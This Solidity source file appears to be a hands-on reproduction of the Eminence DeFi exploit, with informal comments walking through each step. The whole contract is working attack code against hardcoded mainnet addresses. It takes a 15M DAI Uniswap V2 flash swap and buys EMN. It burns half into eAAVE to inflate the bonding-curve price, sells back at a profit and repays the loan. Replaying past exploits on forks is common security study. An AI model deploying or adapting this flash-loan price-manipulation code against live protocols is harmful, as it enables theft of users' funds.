//SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;

import "hardhat/console.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import "@uniswap/v2-core/contracts/interfaces/IERC20.sol";
import "./IEminence.sol";


//took out a flash loan from Uniswap

//UNI PAIR: 0xA478c2975Ab1Ea89e8196811F51A7B7Ade33eB11

contract Exploit {

// I am gonna need the Uni interface in order to interact with that contract and take out a flash loan
    IUniswapV2Pair pair = IUniswapV2Pair(0xA478c2975Ab1Ea89e8196811F51A7B7Ade33eB11);

    // that is the DAI address
    IERC20 dai = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);
    IEminence emn = IEminence(0x5ade7aE8660293F2ebfcEfaba91d141d72d221e8);
    IEminence eAAVE = IEminence(0xc08f38f43ADB64d16Fe9f9eFCC2949d9eddEc198);


    uint constant borrowed = 15000000000000000000000000;
    
    function execute() external {
        // take out a flash loan from uniswap, for that let's use the swap method
        // check that out from what the hacker did on tenderly
        pair.swap(borrowed, 0, address(this), "0xdead");
    }

    // we can also implement this function by inheriting "contract Exploit is IUniswapV2Calee

    function uniswapV2Call(address, uint, uint, bytes calldata) external {

        // I want to know the balance of DAI owner by this contract 
        // WE need to import IERC20 interface to check that out! 
       
       // console.log(dai.balanceOf(address(this)));

        // we need to approve the eminence contract to spend our DAI!!
        // the approve function lies in the DAI contract!
        // console.log(emn.balanceOf(address(this)));

        dai.approve(address(emn), type(uint).max);
       
       // after approving the enm contract to spend our DAI we call the buy function
       // to buy ENM tokens in exchange for DAI
       // the first parameter is the amount of dai we buy for 
       // the second parameter is a slippage parameter

        emn.buy(borrowed, 0);

        uint balance = emn.balanceOf(address(this));   
        uint half = balance/2;


        // this burns a huge portion of the emn supply
        eAAVE.buy(half, 0);

        // after than I still hold half of the original emn
        // this sum is worth more! because burning half of the enm supply is gonna affect 
        // the bonding curve so its price is higher!
        // we now also have a new currency called eAAVE

        // console.log(emn.balanceOf(address(this)));

        // I can sell back my ENM to the eminence contract! 
        // I need to implement this function as well to my interface

        emn.sell(half, 0);

        // console.log(dai.balanceOf(address(this)));

        // we sell them for 10M DAI, more than the original value in dai of that half (7.5M)

        // now we need to get our enm back from eAAVE

        uint remainder = eAAVE.balanceOf(address(this));
        eAAVE.sell(remainder, 0);

        uint awardedEMN = emn.balanceOf(address(this));

        // console.log(awardedEMN);

        emn.sell(awardedEMN, 0);

        // console.log(dai.balanceOf(address(this)));

        // we now have 16.6M dai! We can pay uniswap back, close the flash loan with a profit!


        // Let's pay uniswap back, check flash swaps in UniV2 documentation

        uint toReturn = (borrowed * 1000) / 997 + 1;

        dai.transfer((address(pair)), toReturn);


        console.log(dai.balanceOf(address(this)) / 1 ether);

    }

}
